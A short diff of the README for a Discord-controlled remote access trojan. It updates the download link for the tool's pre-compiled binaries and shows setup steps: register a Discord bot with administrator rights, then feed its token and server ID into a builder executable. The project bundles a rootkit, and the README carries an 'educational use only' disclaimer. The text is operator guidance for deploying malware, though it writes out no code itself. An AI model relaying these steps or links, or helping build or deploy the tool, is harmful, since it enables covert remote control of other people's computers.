@@ -13,7 +13,7 @@ This tool is for educational use only, the author will not be held responsible f
 The rootkit in the project was made by "bytecode77". The source of the rootkit can be found here: https://github.com/bytecode77/r77-rootkit
 
 ## **Setup Guide:**
-Download the pre-complied binary's here https://github.com/moom825/Discord-RAT-2.0/releases/tag/1.0
+Download the pre-complied binary's here https://github.com/moom825/Discord-RAT-2.0/releases/tag/2.0
 
 You will first need to register a bot with the Discord developer portal and then add the bot to the Discord server that you want to use to control the bot (make sure the bot has administrator privileges in the Discord server).
 Once the bot is created open "builder.exe" and paste the token in, and paste the guild ID of where you invited the bot
